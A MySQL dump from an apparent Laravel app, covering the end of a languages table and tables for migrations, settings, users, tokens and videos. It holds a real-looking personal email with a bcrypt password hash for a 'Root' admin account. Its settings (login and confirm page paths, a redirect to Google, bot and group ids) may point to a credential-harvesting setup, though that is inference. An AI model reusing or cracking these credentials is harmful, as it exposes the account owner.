(109, 'nb', 'Norwegian Bokmål', 'Norsk bokmål', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(110, 'nd', 'North Ndebele', 'isiNdebele', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(111, 'ne', 'Nepali', 'नेपाली', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(112, 'ng', 'Ndonga', 'Owambo', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(113, 'nn', 'Norwegian Nynorsk', 'Norsk nynorsk', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(114, 'no', 'Norwegian', 'Norsk', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(115, 'ii', 'Nuosu', 'ꆈꌠ꒿ Nuosuhxop', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(116, 'nr', 'South Ndebele', 'isiNdebele', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(117, 'oc', 'Occitan', 'Occitan', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(118, 'oj', 'Ojibwe, Ojibwa', 'ᐊᓂᔑᓈᐯᒧᐎᓐ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(119, 'cu', 'Old Church Slavonic, Church Slavic, Church Slavonic, Old Bulgarian, Old Slavonic', 'ѩзыкъ словѣньскъ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(120, 'om', 'Oromo', 'Afaan Oromoo', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(121, 'or', 'Oriya', 'ଓଡ଼ିଆ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(122, 'os', 'Ossetian, Ossetic', 'ирон æвзаг', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(123, 'pa', 'Panjabi, Punjabi', 'ਪੰਜਾਬੀ, پنجابی‎', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(124, 'pi', 'Pāli', 'पाऴि', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(125, 'fa', 'Persian', 'فارسی', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(126, 'pl', 'Polish', 'polski', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(127, 'ps', 'Pashto, Pushto', 'پښتو', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(128, 'pt', 'Portuguese', 'Português', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(129, 'qu', 'Quechua', 'Runa Simi, Kichwa', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(130, 'rm', 'Romansh', 'rumantsch grischun', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(131, 'rn', 'Kirundi', 'kiRundi', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(132, 'ro', 'Romanian, Moldavian, Moldovan', 'română', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(133, 'ru', 'Russian', 'русский язык', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(134, 'sa', 'Sanskrit (Saṁskṛta)', 'संस्कृतम्', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(135, 'sc', 'Sardinian', 'sardu', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(136, 'sd', 'Sindhi', 'सिन्धी, سنڌي، سندھی‎', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(137, 'se', 'Northern Sami', 'Davvisámegiella', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(138, 'sm', 'Samoan', 'gagana faa Samoa', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(139, 'sg', 'Sango', 'yângâ tî sängö', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(140, 'sr', 'Serbian', 'српски језик', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(141, 'gd', 'Scottish Gaelic; Gaelic', 'Gàidhlig', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(142, 'sn', 'Shona', 'chiShona', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(143, 'si', 'Sinhala, Sinhalese', 'සිංහල', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(144, 'sk', 'Slovak', 'slovenčina', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(145, 'sl', 'Slovene', 'slovenščina', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(146, 'so', 'Somali', 'Soomaaliga, af Soomaali', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(147, 'st', 'Southern Sotho', 'Sesotho', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(148, 'es', 'Spanish; Castilian', 'español, castellano', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(149, 'su', 'Sundanese', 'Basa Sunda', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(150, 'sw', 'Swahili', 'Kiswahili', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(151, 'ss', 'Swati', 'SiSwati', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(152, 'sv', 'Swedish', 'svenska', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(153, 'ta', 'Tamil', 'தமிழ்', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(154, 'te', 'Telugu', 'తెలుగు', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(155, 'tg', 'Tajik', 'тоҷикӣ, toğikī, تاجیکی‎', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(156, 'th', 'Thai', 'ไทย', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(157, 'ti', 'Tigrinya', 'ትግርኛ', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(158, 'bo', 'Tibetan Standard, Tibetan, Central', 'བོད་ཡིག', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(159, 'tk', 'Turkmen', 'Türkmen, Түркмен', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(160, 'tl', 'Tagalog', 'Wikang Tagalog, ᜏᜒᜃᜅ᜔ ᜆᜄᜎᜓᜄ᜔', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(161, 'tn', 'Tswana', 'Setswana', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(162, 'to', 'Tonga (Tonga Islands)', 'faka Tonga', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(163, 'tr', 'Turkish', 'Türkçe', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(164, 'ts', 'Tsonga', 'Xitsonga', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(165, 'tt', 'Tatar', 'татарча, tatarça, تاتارچا‎', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(166, 'tw', 'Twi', 'Twi', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(167, 'ty', 'Tahitian', 'Reo Tahiti', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(168, 'ug', 'Uighur, Uyghur', 'Uyƣurqə, ئۇيغۇرچە‎', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(169, 'uk', 'Ukrainian', 'українська', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(170, 'ur', 'Urdu', 'اردو', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(171, 'uz', 'Uzbek', 'zbek, Ўзбек, أۇزبېك‎', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(172, 've', 'Venda', 'Tshivenḓa', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(173, 'vi', 'Vietnamese', 'Tiếng Việt', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(174, 'vo', 'Volapük', 'Volapük', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(175, 'wa', 'Walloon', 'Walon', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(176, 'cy', 'Welsh', 'Cymraeg', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(177, 'wo', 'Wolof', 'Wollof', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(178, 'fy', 'Western Frisian', 'Frysk', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(179, 'xh', 'Xhosa', 'isiXhosa', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(180, 'yi', 'Yiddish', 'ייִדיש', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(181, 'yo', 'Yoruba', 'Yorùbá', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(182, 'za', 'Zhuang, Chuang', 'Saɯ cueŋƅ, Saw cuengh', 0, 0, 0, '2024-05-31 10:46:09', '2024-05-31 10:46:09');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(15, '2014_10_12_000000_create_users_table', 1),
(16, '2014_10_12_100000_create_password_reset_tokens_table', 1),
(17, '2019_08_19_000000_create_failed_jobs_table', 1),
(18, '2019_12_14_000001_create_personal_access_tokens_table', 1),
(19, '2023_10_28_063544_create_languages_table', 1),
(20, '2023_10_28_063553_create_labels_table', 1),
(21, '2023_10_29_033408_create_settings_table', 1);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `password_reset_tokens`
--

CREATE TABLE `password_reset_tokens` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `personal_access_tokens`
--

CREATE TABLE `personal_access_tokens` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `tokenable_type` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `tokenable_id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL,
  `abilities` text COLLATE utf8mb4_unicode_ci,
  `last_used_at` timestamp NULL DEFAULT NULL,
  `expires_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `settings`
--

CREATE TABLE `settings` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `value` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `settings`
--

INSERT INTO `settings` (`id`, `key`, `value`, `created_at`, `updated_at`) VALUES
(1, 'favicon_icon', '/assets/img/user.png', '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(2, 'path_welcome_page', '/', '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(3, 'path_login_page', '/login', '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(4, 'path_confirm_page', '/confirm', '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(5, 'redirect_url', 'https://google.com', '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(6, 'bot_id', '', '2024-05-31 10:46:09', '2024-05-31 10:46:09'),
(7, 'group_id', '', '2024-05-31 10:46:09', '2024-05-31 10:46:09');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `users`
--

CREATE TABLE `users` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `users`
--

INSERT INTO `users` (`id`, `name`, `email`, `email_verified_at`, `password`, `remember_token`, `created_at`, `updated_at`) VALUES
(1, 'Root', 'duongvankhai2022001@gmail.com', NULL, '$2y$10$QCp4mQkYS0ol8MXa09mIneD6iQyvthZk9QAS7/as2MQ9zdH5WKU3y', NULL, '2024-05-31 10:46:09', '2024-05-31 10:46:09');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `videos`
--

CREATE TABLE `videos` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `link` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` int(11) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `videos`
--

INSERT INTO `videos` (`id`, `link`, `active`, `created_at`, `updated_at`) VALUES
(4, '/storage/upload/2024-04-04/15-41-00test1.gif', 0, '2024-04-04 08:41:02', '2024-04-06 16:17:37'),
(5, '/storage/upload/2024-04-04/15-41-11test2.gif', 0, '2024-04-04 08:41:13', '2024-04-04 16:44:53'),
(6, '/storage/upload/2024-04-04/15-41-19test3.gif', 0, '2024-04-04 08:41:21', '2024-04-05 15:55:03');

--
-- Chỉ mục cho các bảng đã đổ
--

--
-- Chỉ mục cho bảng `failed_jobs`
--
ALTER TABLE `failed_jobs`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `failed_jobs_uuid_unique` (`uuid`);

--
-- Chỉ mục cho bảng `labels`
--
ALTER TABLE `labels`
  ADD PRIMARY KEY (`id`),
  ADD KEY `labels_code_index` (`code`),
  ADD KEY `labels_position_index` (`position`),
  ADD KEY `labels_language_id_index` (`language_id`);

--
-- Chỉ mục cho bảng `languages`
--
ALTER TABLE `languages`
  ADD PRIMARY KEY (`id`),
  ADD KEY `languages_code_index` (`code`);

--
-- Chỉ mục cho bảng `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `password_reset_tokens`
--
ALTER TABLE `password_reset_tokens`
  ADD PRIMARY KEY (`email`);

--
-- Chỉ mục cho bảng `personal_access_tokens`
--
ALTER TABLE `personal_access_tokens`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `personal_access_tokens_token_unique` (`token`),
  ADD KEY `personal_access_tokens_tokenable_type_tokenable_id_index` (`tokenable_type`,`tokenable_id`);

--
-- Chỉ mục cho bảng `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `users_email_unique` (`email`);

--
-- Chỉ mục cho bảng `videos`
--
ALTER TABLE `videos`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT cho các bảng đã đổ
--

--
-- AUTO_INCREMENT cho bảng `failed_jobs`
--
ALTER TABLE `failed_jobs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT cho bảng `labels`
--
ALTER TABLE `labels`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=83;

--
-- AUTO_INCREMENT cho bảng `languages`
--
ALTER TABLE `languages`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=183;

--
-- AUTO_INCREMENT cho bảng `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=22;

--
-- AUTO_INCREMENT cho bảng `personal_access_tokens`
--
ALTER TABLE `personal_access_tokens`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT cho bảng `settings`
--
ALTER TABLE `settings`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT cho bảng `users`
--
ALTER TABLE `users`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT cho bảng `videos`
--
ALTER TABLE `videos`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
